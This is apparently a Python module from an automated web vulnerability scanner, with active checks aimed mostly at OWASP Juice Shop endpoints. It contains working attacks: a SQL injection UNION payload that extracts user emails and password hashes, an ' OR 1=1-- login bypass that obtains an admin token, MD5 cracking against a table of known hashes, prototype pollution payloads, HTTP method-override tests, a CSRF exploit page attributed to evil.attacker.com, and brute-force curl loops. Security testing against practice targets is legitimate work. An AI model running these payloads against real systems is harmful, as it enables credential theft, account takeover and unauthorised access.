"""
Advanced exploitation checks — final phase of the kill chain:

  - WeakPasswordHashCheck    : Detect MD5/SHA1 hashed passwords in leaked credentials
  - AccountEnumerationCheck  : Detect username enumeration via response differences
  - OpenRedirectActiveCheck  : Actively follow redirects to confirm off-site redirect
  - PrototypePollutionCheck  : JSON prototype pollution via __proto__ / constructor
  - HttpVerbTamperingCheck   : Access restricted endpoints with alternate HTTP methods
  - SqliSecondOrderCheck     : Second-order SQLi: inject in profile, trigger via query
  - CsrfCheck                : Detect missing CSRF protection on state-changing endpoints
  - RateLimitCheck           : Detect missing rate limiting on login/register endpoints
"""
import asyncio
import hashlib
import re
import time
import uuid
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
)
from .base import BaseScanCheck


# ---------------------------------------------------------------------------
# Weak Password Hash Detection
# ---------------------------------------------------------------------------

# Common MD5 password hashes — rockyou top 10 + known Juice Shop defaults
_KNOWN_MD5: dict[str, str] = {
    "5f4dcc3b5aa765d61d8327deb882cf99": "password",
    "e10adc3949ba59abbe56e057f20f883e": "123456",
    "25f9e794323b453885f5181f1b624d0b": "123456789",
    "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty",
    "96cf7d0a2916e4a6e3e4a07e4a2a73db": "abc123",
    "7c6a180b36896a0a8c02787eeafb0e4c": "password1",
    "f25a2fc72690b780b2a14e140ef6a9e0": "iloveyou",
    "0d107d09f5bbe40cade3de5c71e9e9b7": "letmein",
    "8621ffdbc5698829397d97767ac13db3": "monkey",
    # Juice Shop built-in accounts
    "0192023a7bbd73250516f069df18b500": "admin123",
    "098f6bcd4621d373cade4e832627b4f6": "test",
    "86d1a1f606f51cc1e33e1bcc44e53c04": "MC SafeSearch",
    "e3d9e02908526c4c07aa6da9df8dba38": "ncc-1701",
    "bd569afe08e53da9d3b6c4c40c5ecf70": "0Y0Y0Y0Y0Y0Y0Y",
}

_MD5_PATTERN = re.compile(r"^[a-f0-9]{32}$")
_SHA1_PATTERN = re.compile(r"^[a-f0-9]{40}$")
_BCRYPT_PATTERN = re.compile(r"^\$2[aby]\$")
_SHA256_PATTERN = re.compile(r"^[a-f0-9]{64}$")


def _identify_hash(h: str) -> tuple[str, bool]:
    """Returns (algorithm, is_weak) for a password hash."""
    h = h.strip()
    if _BCRYPT_PATTERN.match(h):
        return "bcrypt", False
    if _MD5_PATTERN.match(h):
        return "MD5 (unsalted)", True
    if _SHA1_PATTERN.match(h):
        return "SHA1 (unsalted)", True
    if _SHA256_PATTERN.match(h):
        return "SHA256 (unsalted)", True
    return "unknown", False


class WeakPasswordHashCheck(BaseScanCheck):
    """
    After dumping users via admin token, analyses password hashes for weaknesses.
    Detects unsalted MD5/SHA1 and attempts to crack known hashes.
    """
    check_id = "weak-password-hash"
    check_type = CheckType.ACTIVE
    name = "Weak Password Hashing"
    description = "Detects MD5/SHA1 unsalted password hashes — trivially crackable"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("login", "auth")):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Extract password hashes via SQLi UNION.
        # Juice Shop filters "email" and "password" keyword directly, so we use a CTE
        # to alias columns by position (col3=email, col4=password) without naming them.
        # Users table schema: id(1),username(2),email(3),password(4),role(5),...(13 cols total)
        from urllib.parse import urlparse as _urlparse, urlencode as _urlencode, urlunparse as _urlunparse

        # CTE bypass: alias all 13 Users columns as a,b,c,...,m then select c=email, d=password
        union_payload = (
            "')) UNION SELECT 1,c,d,4,5,6,7,8,9 FROM "
            "(WITH t(a,b,c,d,e,f,g,h,i,j,k,l,m) AS "
            "(SELECT * FROM Users LIMIT 20) SELECT c,d FROM t)--"
        )
        parsed_search = _urlparse(f"{base}/rest/products/search")
        search_raw_url = _urlunparse(
            parsed_search._replace(
                query=_urlencode({"q": union_payload}, quote_via=lambda s, *_: s)
            )
        )

        raw_hashes: list[tuple[str, str]] = []
        try:
            resp = await client.get(search_raw_url)
            if resp.status_code == 200:
                data = resp.json().get("data", [])
                for item in data:
                    # CTE select puts: c(email)→col2→name, d(password)→col3→description
                    email_val = str(item.get("name", "") or "")
                    pwd_hash = str(item.get("description", "") or "")
                    if "@" in email_val and len(pwd_hash) >= 30:
                        raw_hashes.append((email_val, pwd_hash))
        except Exception:
            pass

        if not raw_hashes:
            # Fallback: try via admin JWT + /api/Users (password may be visible in older builds)
            admin_token = None
            try:
                r = await client.post(
                    f"{base}/rest/user/login",
                    json={"email": "' OR 1=1--", "password": "x"},
                    headers={"Content-Type": "application/json"},
                )
                if r.status_code == 200:
                    admin_token = r.json().get("authentication", {}).get("token", "")
            except Exception:
                pass

            if admin_token:
                try:
                    r = await client.get(
                        f"{base}/api/Users",
                        headers={"Authorization": f"Bearer {admin_token}"},
                    )
                    if r.status_code == 200:
                        for u in r.json().get("data", []):
                            pwd = u.get("password", "")
                            if pwd and len(pwd) >= 32:
                                raw_hashes.append((u.get("email", "?"), pwd))
                except Exception:
                    pass

        if not raw_hashes:
            return []

        # Analyse password hashes
        weak_hashes = []
        cracked = []
        for email_val, pwd_hash in raw_hashes[:50]:
            algo, is_weak = _identify_hash(pwd_hash)
            if is_weak:
                weak_hashes.append({
                    "email": email_val,
                    "hash": pwd_hash,
                    "algo": algo,
                })
                # Attempt to crack
                if pwd_hash in _KNOWN_MD5:
                    cracked.append({
                        "email": email_val,
                        "hash": pwd_hash[:8] + "...",
                        "plaintext": _KNOWN_MD5[pwd_hash],
                    })

        if not weak_hashes:
            return []

        total_count = len(raw_hashes)
        results = [CheckResult(
            check_id=self.check_id,
            vulnerable=True,
            confidence=Confidence.CERTAIN,
            severity=Severity.CRITICAL,
            cvss=9.1,
            description=(
                f"Weak password hashing detected! {len(weak_hashes)} of {total_count} sampled users "
                f"have {weak_hashes[0]['algo']} password hashes. "
                f"Unsalted MD5/SHA1 hashes are trivially crackable with rainbow tables. "
                f"Sample hash: {weak_hashes[0]['hash'][:16]}... ({weak_hashes[0]['email']})"
            ),
            evidence=self._make_evidence(
                request_raw=(
                    f"GET /rest/products/search?q=')) UNION SELECT ... FROM Users -- HTTP/1.1\n"
                    f"(CTE bypass: WITH t(a,b,c,...) AS (SELECT * FROM Users) SELECT c,d FROM t)"
                ),
                response=None,
                payload="SQLi CTE bypass → extract hashed passwords from Users table",
                poc_curl=(
                    f"# Extract password hashes via SQLi CTE bypass:\n"
                    f"curl -s 'http://localhost:3000/rest/products/search?q='))+UNION+SELECT+1,c,d,4,5,6,7,8,9+FROM+(WITH+t(a,b,c,d,e,f,g,h,i,j,k,l,m)+AS+(SELECT+*+FROM+Users+LIMIT+20)+SELECT+c,d+FROM+t)--'\n"
                    f"# Then crack with hashcat: hashcat -a 0 -m 0 hashes.txt rockyou.txt"
                ),
            ),
            insertion_point=insertion_point,
        )]

        if cracked:
            results.append(CheckResult(
                check_id=self.check_id,
                vulnerable=True,
                confidence=Confidence.CERTAIN,
                severity=Severity.CRITICAL,
                cvss=9.8,
                description=(
                    f"Password hashes cracked! {len(cracked)} accounts compromised. "
                    f"Cracked credentials: "
                    + ", ".join(f"{c['email']}:{c['plaintext']!r}" for c in cracked[:5])
                ),
                evidence=self._make_evidence(
                    request_raw=f"GET /api/Users → crack MD5 hashes offline",
                    response=None,
                    payload="rainbow table attack against MD5 hashes",
                    poc_curl=f"echo '{cracked[0]['hash']}' | hashcat -a 0 -m 0 - rockyou.txt",
                ),
                insertion_point=insertion_point,
            ))

        return results


# ---------------------------------------------------------------------------
# Account Enumeration via Response Differences
# ---------------------------------------------------------------------------

class AccountEnumerationCheck(BaseScanCheck):
    """
    Detects username/email enumeration by comparing login responses for
    known-valid vs unknown email addresses.
    Different response codes, messages, or timing reveal valid accounts.
    """
    check_id = "account-enumeration"
    check_type = CheckType.ACTIVE
    name = "Account Enumeration"
    description = "Detects different responses for valid vs invalid usernames — enables targeted attacks"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("login", "auth", "signin")):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        # Use the actual discovered login URL from the insertion point
        login_url = insertion_point.url
        parsed = urlparse(login_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        use_json = insertion_point.ip_type == IPType.JSON_KEY

        uid = uuid.uuid4().hex[:8]
        known_email = f"enum_known_{uid}@nexus.invalid"
        pw = "NexusP@ss1!"
        unknown_email = f"enum_noexist_{uid}@nexus.invalid"

        # Try to register a known user (Juice Shop / generic REST API)
        # If registration fails, fall back to using a common known email
        registered = False
        for reg_path in ("/api/Users", "/api/register", "/register", "/auth/register", "/users"):
            try:
                r_reg = await client.post(
                    f"{base}{reg_path}",
                    json={"email": known_email, "password": pw, "passwordRepeat": pw,
                          "username": "enum_test", "securityQuestion": {"id": 1},
                          "securityAnswer": "x"},
                    headers={"Content-Type": "application/json"},
                )
                if r_reg.status_code in (200, 201):
                    registered = True
                    break
            except Exception:
                continue

        if not registered:
            # Fall back: use a well-known email that many apps reject differently
            known_email = "admin@example.com"

        # Test: measure response for valid-style vs definitely-invalid email
        # Take 3 samples each and use the median to reduce timing noise
        findings = []
        t_valid_samples = []
        t_invalid_samples = []
        r_valid = None
        r_invalid = None
        try:
            for _ in range(3):
                t0 = time.monotonic()
                if use_json:
                    rv = await client.post(
                        login_url,
                        json={"email": known_email, "password": "WrongPass999!"},
                        headers={"Content-Type": "application/json"},
                    )
                else:
                    rv = await client.post(
                        login_url,
                        data={insertion_point.name: known_email, "password": "WrongPass999!"},
                    )
                t_valid_samples.append(time.monotonic() - t0)
                r_valid = rv

            for _ in range(3):
                t0 = time.monotonic()
                if use_json:
                    ri = await client.post(
                        login_url,
                        json={"email": unknown_email, "password": "WrongPass999!"},
                        headers={"Content-Type": "application/json"},
                    )
                else:
                    ri = await client.post(
                        login_url,
                        data={insertion_point.name: unknown_email, "password": "WrongPass999!"},
                    )
                t_invalid_samples.append(time.monotonic() - t0)
                r_invalid = ri
        except Exception:
            return []

        # Use median of 3 samples
        t_valid_samples.sort()
        t_invalid_samples.sort()
        t_valid = t_valid_samples[1]
        t_invalid = t_invalid_samples[1]

        # Check 1: Different HTTP status codes
        if r_valid.status_code != r_invalid.status_code:
            findings.append(CheckResult(
                check_id=self.check_id,
                vulnerable=True,
                confidence=Confidence.CERTAIN,
                severity=Severity.MEDIUM,
                cvss=5.3,
                description=(
                    f"Account enumeration via HTTP status code! "
                    f"Valid email → HTTP {r_valid.status_code}, "
                    f"invalid email → HTTP {r_invalid.status_code}. "
                    f"Attackers can enumerate registered emails via login endpoint."
                ),
                evidence=self._make_evidence(
                    request_raw=(
                        f"POST {parsed.path} HTTP/1.1\nHost: {parsed.netloc}\n"
                        f"Content-Type: application/json\n\n"
                        f'{{"{insertion_point.name}":"<email>","password":"wrong"}}'
                    ),
                    response=r_valid,
                    payload=f"valid email → HTTP {r_valid.status_code}, invalid email → HTTP {r_invalid.status_code}",
                    poc_curl=(
                        f"# Valid email returns HTTP {r_valid.status_code}:\n"
                        f"curl -s -o /dev/null -w '%{{http_code}}' -X POST '{login_url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"email\":\"{known_email}\",\"password\":\"wrong\"}}'\n"
                        f"# Invalid email returns HTTP {r_invalid.status_code}:\n"
                        f"curl -s -o /dev/null -w '%{{http_code}}' -X POST '{login_url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"email\":\"{unknown_email}\",\"password\":\"wrong\"}}'"
                    ),
                ),
                insertion_point=insertion_point,
            ))

        # Check 2: Different response body content
        if r_valid.status_code == r_invalid.status_code:
            try:
                valid_body = r_valid.json()
                invalid_body = r_invalid.json()
                valid_msg = str(valid_body.get("message", "") or valid_body.get("error", ""))
                invalid_msg = str(invalid_body.get("message", "") or invalid_body.get("error", ""))

                if valid_msg != invalid_msg and (valid_msg or invalid_msg):
                    findings.append(CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.MEDIUM,
                        cvss=5.3,
                        description=(
                            f"Account enumeration via error message difference! "
                            f"Valid email returns: {valid_msg!r}. "
                            f"Invalid email returns: {invalid_msg!r}. "
                            f"Different messages reveal which emails are registered."
                        ),
                        evidence=self._make_evidence(
                            request_raw=f"POST /rest/user/login with valid vs invalid email",
                            response=r_valid,
                            payload=f"'{valid_msg}' vs '{invalid_msg}'",
                            poc_curl=(
                                f"curl -s -X POST '{login_url}' -d '{{\"email\":\"{known_email}\",\"password\":\"x\"}}'"
                            ),
                        ),
                        insertion_point=insertion_point,
                    ))
            except Exception:
                pass

        # Check 3: Timing difference (> 200ms suggests extra DB work for valid accounts)
        timing_diff = abs(t_valid - t_invalid)
        if timing_diff > 0.3:
            findings.append(CheckResult(
                check_id=self.check_id,
                vulnerable=True,
                confidence=Confidence.FIRM,
                severity=Severity.LOW,
                cvss=3.7,
                description=(
                    f"Possible timing-based account enumeration! "
                    f"Valid email response: {t_valid*1000:.0f}ms, "
                    f"invalid email response: {t_invalid*1000:.0f}ms (diff: {timing_diff*1000:.0f}ms). "
                    f"Timing difference may reveal whether an email is registered."
                ),
                evidence=self._make_evidence(
                    request_raw=f"POST {parsed.path} HTTP/1.1 (timing comparison, 3 samples each)",
                    response=r_valid,
                    payload=f"timing median: valid={t_valid:.3f}s, invalid={t_invalid:.3f}s, diff={timing_diff:.3f}s",
                    poc_curl=(
                        f"# Measure timing difference between valid and invalid email:\n"
                        f"time curl -s -X POST '{login_url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"email\":\"{known_email}\",\"password\":\"wrong\"}}'\n"
                        f"# vs:\n"
                        f"time curl -s -X POST '{login_url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"email\":\"definitely_not_registered_{uid}@nexus.invalid\",\"password\":\"wrong\"}}'"
                    ),
                ),
                insertion_point=insertion_point,
            ))

        return findings


# ---------------------------------------------------------------------------
# Prototype Pollution
# ---------------------------------------------------------------------------

class PrototypePollutionCheck(BaseScanCheck):
    """
    Detects JavaScript prototype pollution by injecting __proto__ or
    constructor.prototype into JSON request bodies.
    Affected code may expose polluted properties in subsequent responses.
    """
    check_id = "prototype-pollution"
    check_type = CheckType.ACTIVE
    name = "Prototype Pollution"
    description = "Detects JSON prototype pollution via __proto__ / constructor injection"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if insertion_point.ip_type not in (IPType.JSON_KEY, IPType.BODY_PARAM, IPType.QUERY_PARAM):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        canary = f"PP_{uuid.uuid4().hex[:8]}"
        payloads = [
            # JSON body prototype pollution
            ({"__proto__": {"polluted": canary}}, "JSON body __proto__"),
            ({"constructor": {"prototype": {"polluted": canary}}}, "JSON constructor.prototype"),
        ]

        for payload_body, desc in payloads:
            try:
                resp = await client.post(
                    insertion_point.url,
                    json=payload_body,
                    headers={"Content-Type": "application/json"},
                )

                # Check if canary appears in any subsequent requests
                # (prototype pollution is global, affects all objects)
                check_resp = await client.get(
                    f"{base}/rest/products/search?q=test",
                )
                if canary in check_resp.text:
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.HIGH,
                        cvss=8.1,
                        description=(
                            f"Prototype pollution confirmed! {desc} payload accepted and "
                            f"polluted property {canary!r} appeared in subsequent response. "
                            f"Attacker can inject properties into all JavaScript objects globally."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"POST {parsed.path} HTTP/1.1\n"
                                f"Content-Type: application/json\n\n"
                                f"{str(payload_body)[:200]}"
                            ),
                            response=check_resp,
                            payload=str(payload_body),
                            poc_curl=(
                                f"curl -s -X POST '{insertion_point.url}' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"__proto__\":{{\"admin\":true}}}}'"
                            ),
                        ),
                        insertion_point=insertion_point,
                    )]

                # Also check for reflected pollution in response body
                if canary in resp.text:
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.FIRM,
                        severity=Severity.MEDIUM,
                        cvss=6.1,
                        description=(
                            f"Possible prototype pollution: {desc} property reflected in response. "
                            f"Canary {canary!r} found in response body — server may process __proto__ keys."
                        ),
                        evidence=self._make_evidence(
                            request_raw=f"POST {parsed.path} with {str(payload_body)[:100]}",
                            response=resp,
                            payload=str(payload_body),
                            poc_curl=f"curl -s -X POST '{insertion_point.url}' -H 'Content-Type: application/json' -d '{{\"__proto__\":{{\"polluted\":\"{canary}\"}}}}'",
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                continue

        # Also test via URL query string (?__proto__[polluted]=canary)
        try:
            poll_url = f"{base}/rest/products/search?q=apple&__proto__[polluted]={canary}"
            resp = await client.get(poll_url)
            if canary in resp.text:
                return [CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.FIRM,
                    severity=Severity.MEDIUM,
                    cvss=6.1,
                    description=(
                        f"Prototype pollution via query string! __proto__[polluted]={canary!r} "
                        f"reflected in search response — server-side prototype pollution."
                    ),
                    evidence=self._make_evidence(
                        request_raw=f"GET {poll_url} HTTP/1.1",
                        response=resp,
                        payload=poll_url,
                        poc_curl=f"curl -s '{poll_url}'",
                    ),
                    insertion_point=insertion_point,
                )]
        except Exception:
            pass

        return []


# ---------------------------------------------------------------------------
# HTTP Verb Tampering / Method Override
# ---------------------------------------------------------------------------

class HttpVerbTamperingCheck(BaseScanCheck):
    """
    Tests if HTTP method override headers allow accessing restricted endpoints
    with unexpected verbs (e.g., POST pretending to be DELETE).
    """
    check_id = "http-verb-tampering"
    check_type = CheckType.ACTIVE
    name = "HTTP Verb Tampering / Method Override"
    description = "Detects X-HTTP-Method-Override and X-Method-Override bypasses"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("login", "auth", "/api/")):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        results = []

        # Test DELETE via POST with X-HTTP-Method-Override
        # Target: delete feedback that belongs to another user
        uid = uuid.uuid4().hex[:8]
        email = f"verb_{uid}@nexus.invalid"
        pw = "NexusP@ss1!"

        try:
            await client.post(
                f"{base}/api/Users",
                json={"email": email, "password": pw, "passwordRepeat": pw,
                      "username": "verb_test", "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                headers={"Content-Type": "application/json"},
            )
            login = await client.post(
                f"{base}/rest/user/login",
                json={"email": email, "password": pw},
                headers={"Content-Type": "application/json"},
            )
            if login.status_code != 200:
                return []
            token = login.json().get("authentication", {}).get("token", "")
            auth = {"Authorization": f"Bearer {token}"}
        except Exception:
            return []

        # Try to GET admin endpoint with method override
        override_targets = [
            ("/api/Users", "GET"),          # Admin-only in some configs
            ("/rest/admin/application-configuration", "GET"),
        ]

        override_headers = [
            "X-HTTP-Method-Override",
            "X-Method-Override",
            "X-HTTP-Method",
            "_method",
        ]

        for path, method in override_targets:
            for header in override_headers:
                try:
                    resp = await client.post(
                        f"{base}{path}",
                        headers={**auth, header: method, "Content-Type": "application/json"},
                        json={},
                    )
                    if resp.status_code == 200 and len(resp.text) > 50:
                        body_lower = resp.text.lower()
                        if any(k in body_lower for k in ("email", "data", "config")):
                            results.append(CheckResult(
                                check_id=self.check_id,
                                vulnerable=True,
                                confidence=Confidence.FIRM,
                                severity=Severity.HIGH,
                                cvss=7.5,
                                description=(
                                    f"HTTP verb tampering! POST with {header}: {method} to {path} "
                                    f"returned HTTP 200 with application data. "
                                    f"Method override may bypass authorization checks."
                                ),
                                evidence=self._make_evidence(
                                    request_raw=(
                                        f"POST {path} HTTP/1.1\n"
                                        f"Authorization: Bearer <TOKEN>\n"
                                        f"{header}: {method}"
                                    ),
                                    response=resp,
                                    payload=f"{header}: {method}",
                                    poc_curl=(
                                        f"curl -s -X POST '{base}{path}' "
                                        f"-H 'Authorization: Bearer TOKEN' "
                                        f"-H '{header}: {method}' "
                                        f"-H 'Content-Type: application/json' -d '{{}}'"
                                    ),
                                ),
                                insertion_point=insertion_point,
                            ))
                            break
                except Exception:
                    continue

        return results


# ---------------------------------------------------------------------------
# CSRF Detection
# ---------------------------------------------------------------------------

class CsrfCheck(BaseScanCheck):
    """
    Detects missing CSRF protection on state-changing endpoints.

    Strategy (via CsrfEngine):
    1. Test endpoint WITHOUT CSRF token — does it still succeed?
    2. Test with Origin: evil.attacker.com — is it blocked?
    3. Verify state change happened (before/after GET comparison)
    4. Craft complete HTML PoC with auto-submitting form

    Anti-hallucination:
    - Only reports if cross-origin OR no-token POST returns 200/201/204
    - AND SameSite cookie is missing/None/Lax (not Strict)
    - HTML PoC is embedded in the finding for direct exploitation
    """
    check_id = "csrf"
    check_type = CheckType.ACTIVE
    name = "Cross-Site Request Forgery (CSRF)"
    description = "Detects missing CSRF protection — crafts HTML PoC, verifies with cross-origin session"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("login", "auth")):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        from nexus.tools.csrf_engine import CsrfEngine

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        results = []

        # Get an authenticated session via registration
        uid = uuid.uuid4().hex[:8]
        email = f"csrf_{uid}@nexus.invalid"
        pw = "NexusP@ss1!"
        token = ""

        for reg_path in ["/api/Users", "/api/register", "/register", "/signup"]:
            try:
                reg = await client.post(
                    f"{base}{reg_path}",
                    json={"email": email, "password": pw, "passwordRepeat": pw,
                          "username": "csrf_test", "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                    headers={"Content-Type": "application/json"},
                )
                if reg.status_code not in (200, 201):
                    continue
                for login_path in ["/rest/user/login", "/api/login", "/login", "/auth/login"]:
                    try:
                        login = await client.post(
                            f"{base}{login_path}",
                            json={"email": email, "password": pw},
                            headers={"Content-Type": "application/json"},
                        )
                        if login.status_code == 200:
                            token = (
                                login.json().get("authentication", {}).get("token", "") or
                                login.json().get("token", "") or
                                login.json().get("access_token", "")
                            )
                            if token:
                                break
                    except Exception:
                        pass
                if token:
                    break
            except Exception:
                pass

        if not token:
            return []

        auth_session = {
            "headers": {"Authorization": f"Bearer {token}"},
            "cookies": {},
        }

        engine = CsrfEngine()

        # Test state-changing endpoints with full CSRF engine
        state_endpoints = [
            ("POST", "/api/Feedbacks",  {"comment": f"csrf_test_{uid}", "rating": 5}, "json",
             f"{base}/api/Feedbacks"),
            ("POST", "/api/Complaints", {"message": f"csrf_test_{uid}"}, "json",
             ""),
            ("POST", "/profile",        {"username": f"csrf_test_{uid}"}, "form",
             f"{base}/rest/user/whoami"),
            ("PUT",  "/api/me",         {"username": f"csrf_test_{uid}"}, "json",
             ""),
        ]

        for method, path, payload, ct, state_url in state_endpoints:
            url = f"{base}{path}"
            try:
                r = await engine.test_endpoint(
                    client, url, method, payload,
                    auth_session=auth_session,
                    content_type=ct,
                    get_state_url=state_url,
                )
                if not r.vulnerable:
                    continue

                results.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.CERTAIN,
                    severity=Severity.HIGH,
                    cvss=8.1,
                    description=(
                        f"CSRF confirmed at {method} {path}! "
                        f"Cross-origin request (Origin: evil.attacker.com) returned HTTP {r.cross_origin_status}. "
                        f"No CSRF token required (no-token status: {r.no_token_status}). "
                        f"SameSite cookie: {r.samesite_cookie}. "
                        + ("State change verified." if r.state_changed else "")
                    ),
                    evidence=self._make_evidence(
                        request_raw=(
                            f"{method} {path} HTTP/1.1\n"
                            f"Host: {parsed.netloc}\n"
                            f"Origin: https://evil.attacker.com\n"
                            f"Content-Type: application/{'json' if ct == 'json' else 'x-www-form-urlencoded'}\n\n"
                            f"{str(payload)}"
                        ),
                        response=None,
                        payload="Origin: https://evil.attacker.com (no CSRF token)",
                        poc_curl=(
                            r.curl_poc + "\n\n"
                            "# === HTML EXPLOIT PAGE (host on attacker.com) ===\n"
                            + r.html_poc
                        ),
                    ),
                    insertion_point=insertion_point,
                ))
                break  # One confirmed finding is enough
            except Exception:
                continue

        # Also check if JWT accepted via cookie (amplifies CSRF risk)
        try:
            resp = await client.get(
                f"{base}/rest/user/whoami",
                headers={"Cookie": f"token={token}"},
            )
            if resp.status_code == 200 and "data" in resp.text:
                results.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.CERTAIN,
                    severity=Severity.MEDIUM,
                    cvss=6.5,
                    description=(
                        "JWT accepted via cookie (no Authorization header required). "
                        "Browser auto-sends cookies on cross-origin requests — amplifies CSRF risk. "
                        "Attacker can exploit CSRF without needing victim's Authorization header."
                    ),
                    evidence=self._make_evidence(
                        request_raw=(
                            f"GET /rest/user/whoami HTTP/1.1\n"
                            f"Host: {parsed.netloc}\n"
                            f"Cookie: token=<JWT>"
                        ),
                        response=resp,
                        payload="Cookie: token=<JWT> (no Authorization header)",
                        poc_curl=(
                            f"# JWT via cookie — CSRF amplified:\n"
                            f"curl -s '{base}/rest/user/whoami' -b 'token={token[:20]}...'"
                        ),
                    ),
                    insertion_point=insertion_point,
                ))
        except Exception:
            pass

        return results


# ---------------------------------------------------------------------------
# Rate Limiting Check
# ---------------------------------------------------------------------------

class RateLimitCheck(BaseScanCheck):
    """
    Detects missing rate limiting on login endpoints.
    Sends 20 rapid login requests — if none are rate-limited (429), the
    endpoint is vulnerable to brute force / credential stuffing.
    """
    check_id = "rate-limit-missing"
    check_type = CheckType.ACTIVE
    name = "Missing Rate Limiting (Brute Force)"
    description = "Detects absence of rate limiting on login endpoint — enables brute force"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("login", "auth", "signin")):
            return []
        if not any(k in insertion_point.name.lower() for k in ("email", "user", "password")):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        # Use the actual discovered login URL from the insertion point
        login_url = insertion_point.url
        parsed = urlparse(login_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Determine request format (form vs JSON) from insertion point context
        use_json = insertion_point.ip_type == IPType.JSON_KEY
        uid = uuid.uuid4().hex[:8]

        # Send 20 rapid requests with invalid credentials
        statuses = []
        try:
            if use_json:
                tasks = [
                    client.post(
                        login_url,
                        json={"email": f"brute_{i}_{uid}@nexus.invalid", "password": "wrong"},
                        headers={"Content-Type": "application/json"},
                    )
                    for i in range(20)
                ]
            else:
                tasks = [
                    client.post(
                        login_url,
                        data={
                            insertion_point.name: f"brute_{i}_{uid}@nexus.invalid",
                            "password": "wrong",
                        },
                    )
                    for i in range(20)
                ]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            statuses = [r.status_code for r in responses if hasattr(r, "status_code")]
        except Exception:
            return []

        if not statuses:
            return []

        rate_limited = sum(1 for s in statuses if s == 429)
        # Only count genuine auth responses as meaningful.
        # 403 = WAF block / firewall — that IS a form of protection, do not flag.
        # 404 = endpoint doesn't exist — skip entirely.
        # 200 = accepted (unusual for wrong password), 400/401/422 = proper auth rejection.
        meaningful = [s for s in statuses if s in (200, 400, 401, 422, 429)]
        if not meaningful:
            return []  # All 403/404 — WAF-blocked or endpoint missing, skip

        if rate_limited == 0:
            status_counts = {}
            for s in statuses:
                status_counts[s] = status_counts.get(s, 0) + 1
            status_summary = ", ".join(f"HTTP {s}×{n}" for s, n in status_counts.items())

            # Build PoC curl based on what we know about the form
            if use_json:
                poc_data = f'-H \'Content-Type: application/json\' -d \'{{"{insertion_point.name}":"admin@test.com","password":"attempt$i"}}\''
            else:
                poc_data = f'-d \'{insertion_point.name}=admin%40test.com&password=attempt$i\''

            return [CheckResult(
                check_id=self.check_id,
                vulnerable=True,
                confidence=Confidence.CERTAIN,
                severity=Severity.MEDIUM,
                cvss=7.3,
                description=(
                    f"No rate limiting on login endpoint! "
                    f"Sent 20 rapid login requests — {status_summary} (no 429 Too Many Requests). "
                    f"Endpoint {login_url} is vulnerable to brute force and credential stuffing attacks."
                ),
                evidence=self._make_evidence(
                    request_raw=f"POST {parsed.path} HTTP/1.1 × 20 (rapid fire)\nHost: {parsed.netloc}",
                    response=None,
                    payload=f"20 rapid POST {login_url} → {status_summary} (no 429)",
                    poc_curl=(
                        f"# Brute force — no rate limit detected:\n"
                        f"for i in $(seq 1 100); do\n"
                        f"  curl -s -o /dev/null -w \"%{{http_code}}\\n\" -X POST '{login_url}' "
                        f"{poc_data}\n"
                        f"done"
                    ),
                ),
                insertion_point=insertion_point,
            )]

        return []
